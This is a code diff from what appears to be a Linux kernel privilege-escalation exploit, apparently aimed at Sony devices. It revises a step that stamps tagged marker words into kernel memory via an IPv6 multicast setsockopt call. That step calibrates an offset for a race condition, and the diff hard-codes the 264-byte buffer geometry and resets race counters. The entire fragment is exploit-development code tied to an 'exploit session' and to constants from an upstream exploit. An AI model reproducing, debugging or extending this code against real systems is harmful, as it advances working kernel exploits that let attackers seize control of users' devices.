@@ -48,15 +48,25 @@ namespace ghostlock::route {
          * panicked shot therefore calibrates the Sony shift exactly, the
          * same way the upstream derived shift=21 from their m1 DIAG fire. */
         if (*layout.waiter_offset == 65535) {
-            __extension__ unsigned char diag[stamp_size]; // NOLINT(clang-analyzer-core.VLASize)
-            memset(diag, 0, sizeof(diag));
-            size_t words = stamp_size / 8;
+            /* v12.8: hard-code the carrier geometry instead of trusting the
+             * conf's buffer_size. The kernel copies exactly sizeof(struct
+             * group_source_req) = 264B (33 words) — upstream ships
+             * SLIDE_MCAST_GSR_WORDS=33 for the same reason. A conf that
+             * inflates buffer_size to 65615 only to satisfy the
+             * waiter_off+lock_offset+8 validator would otherwise be handed
+             * to setsockopt as optlen=65615, i.e. 65KB into a 264B kernel
+             * stack slot. */
+            const size_t kDiagBytes = 264;
+            const size_t words = kDiagBytes / 8;
+            unsigned char diag[kDiagBytes];
             for (size_t j = 0; j < words; ++j) {
                 uint64_t marker = 0xD00D000000000000ULL | (static_cast<uint64_t>(j) * 8);
                 memcpy(diag + j * 8, &marker, sizeof(marker));
             }
-            uint16_t family = AF_UNSPEC;
-            memcpy(diag + 8, &family, sizeof(family));
+            /* v12.8: do NOT clobber word1 with AF_UNSPEC. Word1's marker
+             * already carries an invalid sa_family (0x0008), so the kernel
+             * still rejects after copy_from_user — and every word keeps a
+             * distinct tag, so j=1 decodes instead of collapsing onto j=0. */
             int32_t dfd = socket(AF_INET6, SOCK_DGRAM | SOCK_CLOEXEC, 0);
             if (dfd < 0) {
                 status.step = 62;
@@ -64,10 +74,11 @@ namespace ghostlock::route {
                 status.code = ROUTE_FALLBACK_SAFE;
                 return status;
             }
+            session::g_exploit_session.race.consumer_calls.store(0);
             errno = 0;
-            (void) setsockopt(dfd, IPPROTO_IPV6, 44, diag, (socklen_t) sizeof(diag));
-            pr_info("mcast DIAG stamped %zu words errno=%d; awaiting consumer walk\n",
-                    words, errno);
+            (void) setsockopt(dfd, IPPROTO_IPV6, 44, diag, (socklen_t) kDiagBytes);
+            pr_info("mcast DIAG stamped %zu words (264B) errno=%d; awaiting "
+                    "consumer walk\n", words, errno);
             session::g_exploit_session.race.consumer_go.store(1);
             for (int32_t spin = 0; spin < 100000000 &&
                                    session::g_exploit_session.race.consumer_calls.load() == 0;
